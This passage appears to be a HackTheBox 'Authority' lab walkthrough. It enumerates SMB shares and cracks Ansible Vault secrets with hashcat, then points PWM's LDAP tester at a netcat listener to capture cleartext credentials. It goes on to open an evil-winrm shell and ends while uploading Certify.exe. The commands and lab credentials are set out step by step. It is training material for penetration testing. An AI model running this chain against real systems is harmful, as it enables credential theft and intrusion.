{
    "Development": {
        "Automation/Ansible/ADCS/.ansible-lint": {
            "atime_epoch": "2023-03-17 14:20:48",
            "ctime_epoch": "2023-03-17 14:20:48",
            "mtime_epoch": "2023-03-17 14:37:52",
            "size": "259 B"
        },
        "Automation/Ansible/ADCS/.yamllint": {
            "atime_epoch": "2023-03-17 14:20:48",
            "ctime_epoch": "2023-03-17 14:20:48",
            "mtime_epoch": "2023-03-17 14:37:52",
            "size": "205 B"
        },

[...]

        "Automation/Ansible/PWM/templates/tomcat-users.xml.j2": {
            "atime_epoch": "2023-03-17 14:20:48",
            "ctime_epoch": "2023-03-17 14:20:48",
            "mtime_epoch": "2023-03-17 14:37:52",
            "size": "388 B"
        },
        "Automation/Ansible/SHARE/tasks/main.yml": {
            "atime_epoch": "2023-03-17 14:20:48",
            "ctime_epoch": "2023-03-17 14:20:48",
            "mtime_epoch": "2023-03-17 14:37:52",
            "size": "1.83 KB"
        }
    }
}
```

`mkdir ./development_smbshare`

`smbclient -U 'guest%' //10.10.11.222/Development -c 'prompt OFF;recurse ON;lcd /home/kali/development_smbshare;mget *'`:
```
getting file \Automation\Ansible\ADCS\.ansible-lint of size 259 as Automation/Ansible/ADCS/.ansible-lint (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
getting file \Automation\Ansible\ADCS\.yamllint of size 205 as Automation/Ansible/ADCS/.yamllint (0.5 KiloBytes/sec) (average 0.5 KiloBytes/sec)
getting file \Automation\Ansible\ADCS\LICENSE of size 11364 as Automation/Ansible/ADCS/LICENSE (32.1 KiloBytes/sec) (average 9.7 KiloBytes/sec)
getting file \Automation\Ansible\ADCS\README.md of size 7279 as Automation/Ansible/ADCS/README.md (26.1 KiloBytes/sec) (average 12.8 KiloBytes/sec)
getting file \Automation\Ansible\ADCS\requirements.txt of size 466 as Automation/Ansible/ADCS/requirements.txt (1.7 KiloBytes/sec) (average 11.1 KiloBytes/sec)
getting file \Automation\Ansible\ADCS\requirements.yml of size 264 as Automation/Ansible/ADCS/requirements.yml (0.8 KiloBytes/sec) (average 9.5 KiloBytes/sec)

[...]
```

`tree -L 5 ./development_smbshare`:
```
./development_smbshare
└── Automation
    └── Ansible
        ├── ADCS
        │   ├── defaults
        │   │   └── main.yml
        │   ├── LICENSE
        │   ├── meta
        │   │   ├── main.yml
        │   │   └── preferences.yml
        │   ├── molecule
        │   │   └── default
        │   ├── README.md
        │   ├── requirements.txt
        │   ├── requirements.yml
        │   ├── SECURITY.md
        │   ├── tasks
        │   │   ├── assert.yml
        │   │   ├── generate_ca_certs.yml
        │   │   ├── init_ca.yml
        │   │   ├── main.yml
        │   │   └── requests.yml
        │   ├── templates
        │   │   ├── extensions.cnf.j2
        │   │   └── openssl.cnf.j2
        │   ├── tox.ini
        │   └── vars
        │       └── main.yml
        ├── LDAP
        │   ├── defaults
        │   │   └── main.yml
        │   ├── files
        │   │   └── pam_mkhomedir
        │   ├── handlers
        │   │   └── main.yml
        │   ├── meta
        │   │   └── main.yml
        │   ├── README.md
        │   ├── tasks
        │   │   └── main.yml
        │   ├── templates
        │   │   ├── ldap_sudo_groups.j2
        │   │   ├── ldap_sudo_users.j2
        │   │   ├── sssd.conf.j2
        │   │   └── sudo_group.j2
        │   ├── TODO.md
        │   ├── Vagrantfile
        │   └── vars
        │       ├── debian.yml
        │       ├── main.yml
        │       ├── redhat.yml
        │       └── ubuntu-14.04.yml
        ├── PWM
        │   ├── ansible.cfg
        │   ├── ansible_inventory
        │   ├── defaults
        │   │   └── main.yml
        │   ├── handlers
        │   │   └── main.yml
        │   ├── meta
        │   │   └── main.yml
        │   ├── README.md
        │   ├── tasks
        │   │   └── main.yml
        │   └── templates
        │       ├── context.xml.j2
        │       └── tomcat-users.xml.j2
        └── SHARE
            └── tasks
                └── main.yml

27 directories, 43 files
```

The contents of the `Automation` directory appear to be Ansible playbooks which perhaps were
used to configure some things on the target box. We see a share named `ADCS` which, along with
the box name, could be a hint that Active Directory Certificate Services (AD CS) is installed on the
target. We will keep that in mind for later.

Browsing to port `80` shows an IIS splash page and reveals no further endpoints.

`curl http://10.10.11.222:80/`:
```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>IIS Windows Server</title> ←
<style type="text/css">
<!--
body {
        color:#000000;
        background-color:#0072C6;
        margin:0;
}

#container {
        margin-left:auto;
        margin-right:auto;
        text-align:center;
        }

a img {
        border:none;
}

-->
</style>
</head>
<body>
<div id="container">
<a href="http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409"><img src="iisstart.png" alt="IIS" width="960" height="600" /></a>
</div>
</body>
</html>
```

`curl -I http://10.10.11.222:80/`:
```http
HTTP/1.1 200 OK
Content-Length: 703
Content-Type: text/html
Last-Modified: Tue, 09 Aug 2022 23:00:33 GMT
Accept-Ranges: bytes
ETag: "557c50d443acd81:0"
Server: Microsoft-IIS/10.0 ←
Date: Thu, 07 Nov 2024 19:00:12 GMT
```

`gobuster dir -u http://10.10.11.222 -w ~/tools/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -b 400,401,404,500 -x html,php,bak,jpg,txt,zip -t 15`:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.222
[+] Method:                  GET
[+] Threads:                 15
[+] Wordlist:                /home/kali/tools/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   400,401,404,500
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,bak,jpg,txt,zip,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 1453508 / 1453508 (100.00%)

===============================================================
Finished
===============================================================
```
❌

Browsing to port `8443` using `https://`, we are redirected to `/pwm/private/login`, which
appears to be an instance of an open-source password self-service application that can be use
with LDAP in Active Directory environments.

`curl -k https://10.10.11.222:8443`:
```html
<html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html> 
```

The application is called [`PWM`](https://github.com/pwm-project/pwm).
When visiting the site, we get a popup showing that the application is in `Configuration Mode`, so it seems we need to get into the `Configuration Manager` or `Configuration Editor` (they both redirect to the same path: `/pwm/private/config/login`).
Here there is a form that just takes a password, no username needed.

<img src=".\assets\screenshots\hackthebox_authority_firefox_8443_config_login.png" alt="HackTheBox - Authority | https://10.10.11.222:8443/pwm/private/config/login" width="700"/>

So let's first dig through the `PWM` directory since this is the most likely target right now.

`tree -L 3 ./development_smbshare/Automation/Ansible/PWM`:
```
./development_smbshare/Automation/Ansible/PWM
├── ansible.cfg
├── ansible_inventory
├── defaults
│   └── main.yml ←
├── handlers
│   └── main.yml
├── meta
│   └── main.yml
├── README.md
├── tasks
│   └── main.yml
└── templates
    ├── context.xml.j2
    └── tomcat-users.xml.j2

6 directories, 9 files
```

The `tomcat-users.xml.j2` file contains two passwords but neither work for PWM and the Tomcat manager is not exposed.

The `main.yml` file in the `defaults` directory contains strings encrypted using the Ansible Vault
which allows for one to store sensitive data such as credentials in playbook or role files instead of
in plaintext.

`cat ./development_smbshare/Automation/Ansible/PWM/defaults/main.yml`:
```yaml
---
pwm_run_dir: "{{ lookup('env', 'PWD') }}"

pwm_hostname: authority.htb.corp
pwm_http_port: "{{ http_port }}"
pwm_https_port: "{{ https_port }}"
pwm_https_enable: true

pwm_require_ssl: false

pwm_admin_login: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          32666534386435366537653136663731633138616264323230383566333966346662313161326239
          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
          35653634376333666234613466396534343030656165396464323564373334616262613439343033
          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
          3438

pwm_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          31356338343963323063373435363261323563393235633365356134616261666433393263373736
          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
          38656432323830393339336231373637303535613636646561653637386634613862316638353530
          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
          6531

ldap_uri: ldap://127.0.0.1/
ldap_base_dn: "DC=authority,DC=htb"
ldap_admin_password: !vault |
          $ANSIBLE_VAULT;1.1;AES256
          63303831303534303266356462373731393561313363313038376166336536666232626461653630
          3437333035366235613437373733316635313530326639330a643034623530623439616136363563
          34646237336164356438383034623462323531316333623135383134656263663266653938333334
          3238343230333633350a646664396565633037333431626163306531336336326665316430613566
          3764   
```

There are three different hashes in this file (`pwm_admin_login`, `pwm_admin_password`, and `ldap_admin_password`) which we can convert to a crackable format using `ansible2john.py`.

`vim ./ansible_vault1.txt`:
```
$ANSIBLE_VAULT;1.1;AES256
32666534386435366537653136663731633138616264323230383566333966346662313161326239
6134353663663462373265633832356663356239383039640a346431373431666433343434366139
35653634376333666234613466396534343030656165396464323564373334616262613439343033
6334326263326364380a653034313733326639323433626130343834663538326439636232306531
3438
```

`vim ./ansible_vault2.txt`:
```
$ANSIBLE_VAULT;1.1;AES256
31356338343963323063373435363261323563393235633365356134616261666433393263373736
3335616263326464633832376261306131303337653964350a363663623132353136346631396662
38656432323830393339336231373637303535613636646561653637386634613862316638353530
3930356637306461350a316466663037303037653761323565343338653934646533663365363035
6531
```

`vim ./ansible_vault3.txt`:
```
$ANSIBLE_VAULT;1.1;AES256
63303831303534303266356462373731393561313363313038376166336536666232626461653630
3437333035366235613437373733316635313530326639330a643034623530623439616136363563
34646237336164356438383034623462323531316333623135383134656263663266653938333334
3238343230333633350a646664396565633037333431626163306531336336326665316430613566
3764
```

`ansible2john ./ansible_vault1.txt > ./john_ansible_vault1.txt`

`ansible2john ./ansible_vault2.txt > ./john_ansible_vault2.txt`

`ansible2john ./ansible_vault3.txt > ./john_ansible_vault3.txt`

`cat john_ansible_vault* | tee ./john_ansible_vaults.txt`:
```
ansible_vault1_pwm_admin_login.txt:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8
ansible_vault2_pwm_admin_password.txt:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5
ansible_vault3_ldap_admin_password.txt:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635
```

Now let's try to crack the hashes using `hashcat`. The mode we want is `16900`. We can feed the
hashes to `hashcat` using the `rockyou.txt` wordlist, after trimming off the front part of the hash (they should start with `$ansible$`).

`hashcat -m 16900 ./john_ansible_vaults.txt /usr/share/wordlists/rockyou.txt`:
```
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-penryn-Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz, 1438/2941 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashfile './john_ansible_vaults.txt' on line 1 (ansibl...00eae9dd25d734abba49403c42bc2cd8): Signature unmatched
Hashfile './john_ansible_vaults.txt' on line 2 (ansibl...55a66deae678f4a8b1f8550905f70da5): Signature unmatched
Hashfile './john_ansible_vaults.txt' on line 3 (ansibl...511c3b15814ebcf2fe98334284203635): Signature unmatched
No hashes loaded.

Started: Thu Nov  7 18:01:23 2024
Stopped: Thu Nov  7 18:01:24 2024
```
❌

`hashcat -m 16900 --username ./john_ansible_vaults.txt /usr/share/wordlists/rockyou.txt`:
```
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-penryn-Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz, 1438/2941 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 3 digests; 3 unique digests, 3 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5:!@#$%^&* ←
$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8:!@#$%^&* ←
$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635:!@#$%^&* ←
                                                          
Session..........: hashcat
Status...........: Cracked ←
Hash.Mode........: 16900 (Ansible Vault) ←
Hash.Target......: ./john_ansible_vaults.txt
Time.Started.....: Thu Nov  7 18:03:54 2024 (2 mins, 49 secs)
Time.Estimated...: Thu Nov  7 18:06:43 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      707 H/s (9.20ms) @ Accel:16 Loops:1024 Thr:1 Vec:4
Recovered........: 3/3 (100.00%) Digests (total), 3/3 (100.00%) Digests (new), 3/3 (100.00%) Salts
Progress.........: 119424/43033155 (0.28%)
Rejected.........: 0/119424 (0.00%)
Restore.Point....: 39744/14344385 (0.28%)
Restore.Sub.#1...: Salt:2 Amplifier:0-1 Iteration:9216-9999
Candidate.Engine.: Device Generator
Candidates.#1....: 051790 -> victor2
Hardware.Mon.#1..: Util: 65%

Started: Thu Nov  7 18:02:51 2024
Stopped: Thu Nov  7 18:06:44 2024
```

The hashes all crack to the same password.

`hashcat -m 16900 --username ./john_ansible_vaults.txt --show`:
```
ansible_vault1_pwm_admin_login.txt:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8:!@#$%^&* ←
ansible_vault2_pwm_admin_password.txt:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5:!@#$%^&* ←
ansible_vault3_ldap_admin_password.txt:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635:!@#$%^&* ←
```

Now we can decrypt each one of the encrypted strings found in the `main.yml` file  (`pwm_admin_login`, `pwm_admin_password`, and `ldap_admin_password`), with `ansible-vault`, using the cracked password `!@#$%^&*`.

`ansible-vault decrypt ./ansible_vault1.txt --output ./decrypted_ansible_vault1.txt`:
```
Vault password: ←
Decryption successful 
```

`ansible-vault decrypt ./ansible_vault2.txt --output ./decrypted_ansible_vault2.txt`:
```
Vault password: ←
Decryption successful 
```

`ansible-vault decrypt ./ansible_vault3.txt --output ./decrypted_ansible_vault3.txt`:
```
Vault password: ←
Decryption successful 
```

The first gives us a username.
The second gives us a password.
As a bonus, the third gives us another password, which we find not to be useful anywhere.

`cat ./decrypted_ansible_vault1.txt`:
```
svc_pwm ←
```

`cat ./decrypted_ansible_vault2.txt`:
```
pWm_@dm!N_!23 ←
```

`cat ./decrypted_ansible_vault3.txt`:
```
DevT3st@123
```

Going back to the `PWM` login panel, we are able to log into the `Configuration Editor` with the password just obtained `pWm_@dm!N_!23`.

After digging around the panel for a bit, we find the LDAP connection page that has a `Test LDAP Profile` button.

Sometimes, it is possible to retrieve cleartext credentials by tricking the LDAP connection tester to connect to your own `netcat` listener. Since it is using LDAPS, however, we will need to try editing
the existing LDAP URL `ldaps://authority.htb.corp:636` to use `ldap://` and port `389`, pointing it to our attacking machine's host IP instead (`ldap://10.10.14.22:389`). After editing it like so, we click `OK` to save it.

<img src=".\assets\screenshots\hackthebox_authority_firefox_8443_config_editor.png" alt="HackTheBox - Authority | https://10.10.11.222:8443/pwm/private/config/editor" width="700"/>

Next, we start a `netcat` listener on port 389 and click the `Test LDAP Profile` button on PWM.
We promptly get a callback on our listener that contains the password for the `svc_ldap` account.

`netcat -lvnp 389`:
```
listening on [any] 389 ...
connect to [10.10.14.22] from (UNKNOWN) [10.10.11.222] 55645
0Y`T;CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb�lDaP_1n_th3_cle4r! ←
```

<🔄 Alternative Step>

An alternative is to download, edit, import and then re-download the configuration.

<img src=".\assets\screenshots\hackthebox_authority_firefox_8443_config_manager.png" alt="HackTheBox - Authority | https://10.10.11.222:8443/pwm/private/config/manager" width="700"/>

`cat ./PwmConfiguration.xml`:
```xml
<?xml version="1.0" encoding="UTF-8"?><PwmConfiguration createTime="2022-08-11T01:46:23Z" modifyTime="2022-08-11T01:46:24Z" pwmBuild="c96802e" pwmVersion="2.0.3" xmlVersion="5">
    <!--
                This configuration file has been auto-generated by the PWM password self service application.

                WARNING: This configuration file contains sensitive security information, please handle with care!

                WARNING: If a server is currently running using this configuration file, it will be restarted and the
                 configuration updated immediately when it is modified.

                NOTICE: This file is encoded as UTF-8.  Do not save or edit this file with an editor that does not
                        support UTF-8 encoding.

                If unable to edit using the application ConfigurationEditor web UI, the following options are available:
                      1. Edit this file directly by hand.
                      2. Remove restrictions of the configuration by setting the property "configIsEditable" to "true".
                         This will allow access to the ConfigurationEditor web UI without having to authenticate to an
                         LDAP server first.

                If you wish for sensitive values in this configuration file to be stored unencrypted, set the property
                "storePlaintextValues" to "true". ←
-->
    <properties type="config">
        <property key="configIsEditable">true</property> ←
        <property key="configEpoch">0</property>
        <property key="configPasswordHash">$2a$10$gC/eoR5DVUShlZV4huYlg.L2NtHHmwHIxF3Nfid7FfQLoh17Nbnua</property>
    </properties>

[...]

<setting key="ldap.proxy.password" modifyTime="2022-08-11T01:46:23Z" profile="default" syntax="PASSWORD" syntaxVersion="0">
<label>
LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP Proxy Password
</label>
<value>
ENC-PW:1pc9mN6FtIu7m9nJ3v89UngoUAP0ahyIHV5ZGaH24EhXfwM6E2dQ1OapZOYju9qiTYfsZfkLaNHbjGfbQldz5EW7BqPxGqzMz+bEfyPIvA8=
</value> ←
</setting>

[...]
```

`vim ./PwmConfiguration.xml`:
```xml
<?xml version="1.0" encoding="UTF-8"?><PwmConfiguration createTime="2022-08-11T01:46:23Z" modifyTime="2022-08-11T01:46:24Z" pwmBuild="c96802e" pwmVersion="2.0.3" xmlVersion="5">
    <!--
                This configuration file has been auto-generated by the PWM password self service application.

                WARNING: This configuration file contains sensitive security information, please handle with care!

                WARNING: If a server is currently running using this configuration file, it will be restarted and the
                 configuration updated immediately when it is modified.

                NOTICE: This file is encoded as UTF-8.  Do not save or edit this file with an editor that does not
                        support UTF-8 encoding.

                If unable to edit using the application ConfigurationEditor web UI, the following options are available:
                      1. Edit this file directly by hand.
                      2. Remove restrictions of the configuration by setting the property "configIsEditable" to "true".
                         This will allow access to the ConfigurationEditor web UI without having to authenticate to an
                         LDAP server first.

                If you wish for sensitive values in this configuration file to be stored unencrypted, set the property
                "storePlaintextValues" to "true". ←
-->
    <properties type="config">
        <property key="configIsEditable">true</property>
        <property key="configEpoch">0</property>
        <property key="configPasswordHash">$2a$10$gC/eoR5DVUShlZV4huYlg.L2NtHHmwHIxF3Nfid7FfQLoh17Nbnua</property>
        <property key="storePlaintextValues">true</property> ←
    </properties>

[...]
```

`cat ./PwmConfiguration\(1\).xml`:
```xml
<?xml version="1.0" encoding="UTF-8"?><PwmConfiguration createTime="2022-08-11T01:46:23Z" modifyTime="2022-08-11T01:46:24Z" pwmBuild="c96802e" pwmVersion="2.0.3" xmlVersion="5">
    <!--
                This configuration file has been auto-generated by the PWM password self service application.

                WARNING: This configuration file contains sensitive security information, please handle with care!

                WARNING: If a server is currently running using this configuration file, it will be restarted and the
                 configuration updated immediately when it is modified.

                NOTICE: This file is encoded as UTF-8.  Do not save or edit this file with an editor that does not
                        support UTF-8 encoding.

                If unable to edit using the application ConfigurationEditor web UI, the following options are available:
                      1. Edit this file directly by hand.
                      2. Remove restrictions of the configuration by setting the property "configIsEditable" to "true".
                         This will allow access to the ConfigurationEditor web UI without having to authenticate to an
                         LDAP server first.

                If you wish for sensitive values in this configuration file to be stored unencrypted, set the property
                "storePlaintextValues" to "true". ←
-->
    <properties type="config">
        <property key="configIsEditable">true</property>
        <property key="configEpoch">0</property>
        <property key="configPasswordHash">$2a$10$gC/eoR5DVUShlZV4huYlg.L2NtHHmwHIxF3Nfid7FfQLoh17Nbnua</property>
        <property key="storePlaintextValues">true</property>
    </properties>

[...]

<setting key="ldap.proxy.password" modifyTime="2022-08-11T01:46:23Z" profile="default" syntax="PASSWORD" syntaxVersion="0">
<label>
LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP Proxy Password
</label>
<value>PLAIN:lDaP_1n_th3_cle4r!</value> ←
</setting>

[...]
```

</🔄 Alternative Step>

We now have the following set of AD credentials: `svc_ldap`:`lDaP_1n_th3_cle4r!`.

`crackmapexec smb 10.10.11.222 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'`:
```
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! ←
```

`crackmapexec smb 10.10.11.222 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' --shares`:
```
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
SMB         10.10.11.222    445    AUTHORITY        [*] Enumerated shares
SMB         10.10.11.222    445    AUTHORITY        Share           Permissions     Remark
SMB         10.10.11.222    445    AUTHORITY        -----           -----------     ------
SMB         10.10.11.222    445    AUTHORITY        ADMIN$                          Remote Admin
SMB         10.10.11.222    445    AUTHORITY        C$                              Default share
SMB         10.10.11.222    445    AUTHORITY        Department Shares READ ←           
SMB         10.10.11.222    445    AUTHORITY        Development     READ            
SMB         10.10.11.222    445    AUTHORITY        IPC$            READ            Remote IPC
SMB         10.10.11.222    445    AUTHORITY        NETLOGON        READ            Logon server share 
SMB         10.10.11.222    445    AUTHORITY        SYSVOL          READ            Logon server share 
```

`mkdir ./department_smbshare`

`smbclient -U 'svc_ldap%lDaP_1n_th3_cle4r!' '//10.10.11.222/Department Shares' -c 'prompt OFF;recurse ON;lcd /home/kali/department_smbshare;mget *'`:
```
```
❌

`tree -L 4 ./department_smbshare`:
```
./department_smbshare
├── Accounting
├── Finance
├── HR
├── IT
├── Marketing
├── Operations
├── R&D
└── Sales

9 directories, 0 files ←
```

`crackmapexec winrm 10.10.11.222 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'`:
```
SMB         10.10.11.222    5985   AUTHORITY        [*] Windows 10.0 Build 17763 (name:AUTHORITY) (domain:authority.htb)
HTTP        10.10.11.222    5985   AUTHORITY        [*] http://10.10.11.222:5985/wsman
HTTP        10.10.11.222    5985   AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)
```

`evil-winrm -i 10.10.11.222 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'`:
```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_ldap\Documents>
```

![Victim: svc_ldap](https://custom-icon-badges.demolab.com/badge/Victim-svc%5F_ldap-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
htb\svc_ldap
```

`dir C://Users/svc_ldap/Desktop`:
```
    Directory: C:\Users\svc_ldap\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        11/6/2024   4:38 PM             34 user.txt ←
```

`type C://Users/svc_ldap/Desktop/user.txt`:
```
2f59756c1292f54ee08eb3908d50b8b8

2f597*************************** ←
```

`whoami /all`:
```
USER INFORMATION
----------------

User Name    SID
============ =============================================
htb\svc_ldap S-1-5-21-622327497-3269355298-2248959698-1601


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

`dir C://Users`:
```
    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        3/17/2023   9:31 AM                Administrator
d-r---         8/9/2022   4:35 PM                Public
d-----        3/24/2023  11:27 PM                svc_ldap
```

`net user`:
```
User accounts for \\

-------------------------------------------------------------------------------
Administrator            Guest                    krbtgt
svc_ldap
The command completed with one or more errors.
```

`net user svc_ldap`:
```
User name                    svc_ldap ←
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/10/2022 8:29:31 PM
Password expires             Never
Password changeable          8/11/2022 8:29:31 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   11/6/2024 6:57:48 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use ←
Global Group memberships     *Domain Users ←
The command completed successfully.
```

`net group`:
```
Group Accounts for \\

-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Group Policy Creator Owners
*Key Admins
*Protected Users
*Read-only Domain Controllers
*Schema Admins
The command completed with one or more errors.
```

`net localgroup`:
```
Aliases for \\AUTHORITY

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Account Operators
*Administrators
*Allowed RODC Password Replication Group
*Backup Operators
*Cert Publishers ←
*Certificate Service DCOM Access
*Cryptographic Operators
*Denied RODC Password Replication Group
*Distributed COM Users
*DnsAdmins
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Incoming Forest Trust Builders
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Pre-Windows 2000 Compatible Access
*Print Operators
*RAS and IAS Servers
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Server Operators
*Storage Replica Administrators
*Terminal Server License Servers
*Users
*Windows Authorization Access Group
The command completed successfully.
```

`net localgroup "Cert Publishers"`:
```
Alias name     Cert Publishers
Comment        Members of this group are permitted to publish certificates to the directory

Members

-------------------------------------------------------------------------------
AUTHORITY$ ←
The command completed successfully.
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`cp ~/tools/SharpCollection/NetFramework_4.7_Any/Certify.exe ./certify.exe`

`upload ./certify.exe`:
```
